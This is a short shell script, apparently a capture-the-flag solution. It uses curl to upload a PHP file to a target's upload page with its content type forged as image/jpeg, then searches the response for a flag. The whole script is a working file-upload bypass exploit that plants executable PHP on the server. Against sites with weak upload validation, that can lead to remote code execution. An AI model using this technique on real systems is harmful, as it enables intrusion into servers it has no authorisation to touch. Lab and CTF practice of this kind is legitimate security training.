#!/bin/sh
curl -s -X POST -F "uploaded=@/tmp/test.php;type=image/jpeg" -F "Upload=Upload" "http://$1/index.php?page=upload" | grep 'flag'
